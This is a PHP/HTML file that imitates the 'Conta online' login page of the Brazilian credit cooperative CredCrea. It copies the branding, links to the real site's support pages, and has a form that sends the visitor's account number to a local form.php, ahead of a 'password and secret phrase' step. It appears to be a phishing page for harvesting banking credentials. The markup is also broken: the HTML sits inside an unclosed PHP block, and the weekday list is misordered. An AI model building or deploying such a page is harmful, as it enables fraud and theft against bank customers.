<?php
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRED CREA | Conta online</title>
    <!--Link css Mobile first-->
    <link rel="stylesheet" href="style.css">

    <!--Link para icones-->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />


</head>
<body>

    <header id="head">
        <nav>
            <img id="logotipocredcrea" src="imagens/logo-viacredi.png" alt="LogotirpoCredCrea">
            <p id="dataatual">
                domingo, 10 de dezembro de 2022
            </p>
        </nav>
    </header>

    <div id="fundo">
        <p id="recaptcha">Protegido por reCAPTCHA</p>
        <a href="http://" target="_blank" rel="reCAPTCHA">
        </a>
        <section id="login">
            
                <ul>
                    <li>
                        
                        <i class="material-symbols-outlined" id="icone1">
                            account_circle
                        </i>
                        <span>Digite sua conta</span>


                         <i class="flecha">
                            arrow_forward_ios
                         </i>                       
                    </li>
                    
                    <li>
                        <i class="material-symbols-outlined" id="icone2">
                            account_circle
                        </i>

                        <span id="frase2">Identificação</span>

                        <i class="flecha">
                            arrow_forward_ios
                        </i>   
                    </li>
 
                    <li>
                        <i  class="material-symbols-outlined" id="icone3">
                         lock 
                        </i>   
                        <span id="frase3">Senha e frase secreta</span>
                    </li>

                </ul>
                <hr id="login">

            <form action="form.php" method="post" autocomplete="off">
                <label id="acesso" for="digite">DIGITE O NÚMERO DA SUA CONTA</label>
                <input type="text" id="digite" name="acesso">
        
                <input type="submit" value="Entrar" id="botentrar" name="botentrar">
            </form>
        </section>
      
    </div>
    <footer>
        <p class="botaofooter">SAC - SERVIÇO DE ATENDIMENTO AO COOPERADO</p>
        
        <p class="botaofooter" id="botaofooter2">OUVIDORIAS SISTEMA AILOS</p>
        
        <span class="spanfooter">
            <a class="linkfooter" href="https://www.credcrea.coop.br/privacidade-e-seguranca#conta-online" rel="Segurança" >
                <span class="material-symbols-outlined" id="cadeado">
                lock_open
                </span>
                Segurança
            </a>
        </span>

        <span class="spanfooter">
            <a class="linkfooter" href="https://www.credcrea.coop.br/contato" rel="Fale conosco" id="faleconosco">
                <span class="material-symbols-outlined" id="talkwe">
                    pending
                    </span>Fale conosco
            </a>
    </span>

    </footer>
    

    <a href="https://www.credcrea.coop.br/contato" target="_blank" rel="Precisa de ajuda" id="balaoajuda">
        <div id="ajuda">
     
        <span class="material-symbols-outlined" id="iconeajuda">
            sms
        </span>
       
    </div>
</a>

<script>
    var p = document.querySelector('#dataatual');
    
    var dt=new Date();
    var diasem=dt.getDay();
    var dia=dt.getDate();
    var mes=dt.getMonth();
    var ano=dt.getFullYear();

    var meses=new Array("janeiro","fevereiro","março","abril","maio","junho","julho","agosto","setembro","outubro","novembro","dezembro")

    var semanas=new Array("Segunda-feira","Terça-feira","Quarta-feira","Quinta-feira","Quinta-feira","Sexta-feira","Sábado","Domingo")

    p.innerHTML = (semanas[diasem] + ", " + dia + " de " +  meses[mes] + " " + ano);


    
</script>
    
</body>
</html>

?>